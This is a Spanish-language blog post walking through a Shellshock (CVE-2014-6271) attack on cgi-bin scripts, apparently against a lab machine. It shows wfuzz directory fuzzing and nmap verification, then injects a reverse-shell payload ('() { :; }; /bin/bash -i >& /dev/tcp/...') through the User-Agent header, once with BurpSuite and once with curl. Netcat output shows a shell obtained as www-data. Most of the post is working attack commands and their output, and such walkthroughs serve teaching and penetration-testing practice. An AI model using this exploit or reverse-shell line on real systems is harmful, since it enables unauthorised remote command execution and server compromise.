---
date: 2022-05-19T01:40:05.000Z
layout: post
comments: true
title: Ataque Shellshock
subtitle: 'a través de cgi-bin'
description: >-
image: >-
    http://imgfz.com/i/LT3baoC.png
optimized_image: >-
  http://imgfz.com/i/LT3baoC.png
category: ciberseguridad
tags: 
  - linux
  - hacking
  - exploit
  - vulnerabilidad
  - cgi-bin
author: Felipe Canales Cayuqueo
paginate: true
---

El ataque se Shellshock es una vulnerabilidad de ejecución remota de comandos por medio de bash, es decir, se basa en el hecho de que bash ejecuta incorrectamente los comandos finales cuando importa una definición de función almacenada en una variable de entorno. Para empezar intentaremos reconocer la vulnerabilidad:

* Una manera es observando el código fuente de la página, la cual nos puede entregar pistas sobre el directorio ```cgi-bin```:

  ![1](http://imgfz.com/i/wdlEgfi.png)
  
* Una vez detectado podemos realizar fuzzing para ver que hay tras el directorio ```cgi-bin```:

```bash
┌─[root@kali]─[/shellshock]
└──╼ wfuzz -c -t 300 --hc=404,400,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions.txt http://10.1.1.26/cgi-bin/FUZZ.FUZ2Z
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.1.1.26/cgi-bin/FUZZ.FUZ2Z
Total requests: 441120

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000003375:   500        16 L     77 W       607 Ch      "shell - sh"                                        
000003252:   500        16 L     77 W       607 Ch      "backup - cgi"                                      

Total time: 0
Processed Requests: 441120
Filtered Requests: 441118
Requests/sec.: 0
```

### Verificación de vulnerabilidad

Procedemos a verificar la vulnerabilidad por medio de nmap, en mi caso voy a ocupar ```shell.sh```, sin embargo podría ocupar ```backup.cgi```, ```admin.cgi```, entre otros que estuvieran disponibles:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nmap 10.1.1.26 -p80 --script=http-shellshock --script-args uri=/cgi-bin/shell.sh
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 01:42 EDT
Nmap scan report for 10.1.1.26
Host is up (0.00041s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

```

### Explotación por BurpSuite

Para explotarlo podemos realizarlo por medio de ```BurpSuite``` y ```CURL```, iniciaremos con el primero de ellos en donde nos pondremos a la escucha a través de un puerto:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nc -nlvp 1234
```
Ahora interceptaremos peticiones en la dirección que hemos encontrado:

![2](http://imgfz.com/i/XbhRtWQ.png)

Y cambiaremos el ```User-Agent``` que se encuentra marcado con el cuadro rojo, por lo siguiente:

```bash
User Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```
Procedemos a reemplazar y adaptar el ```User-Agent```:

![3](http://imgfz.com/i/uoBJDHz.png)

Le damos a ```Forward```:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.26] 60756
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ whoami
whoami
www-data
bash-4.3$ 
```

Y recibimos respuesta en el puerto que teníamos a la escucha anteriormente.

## Explotación por CURL

Para realizar la explotación por ```CURL``` probaremos ahora ```backup.cgi``` solo para demostrar que también funciona al igual que ```shell.sh```. En este caso nos pondremos también a la escucha:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nc -nlvp 1234
```

Ahora procedemos a realizar lo siguiente por medio de ```CURL``` y nos debería devolver la bash:

```bash
┌─[root@kali]─[/shellshock]
└──╼ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.1.1.19/1234 0>&1' http://10.1.1.26/cgi-bin/backup.cgi

```

Nos va a quedar ejecutándose y el netcat nos respondería con la bash:

```bash
┌─[root@kali]─[/shellshock]
└──╼ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.26] 60758
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ whoami
whoami
www-data
bash-4.3$ 
```

Y así es como se explotaría un ataque shellshock.
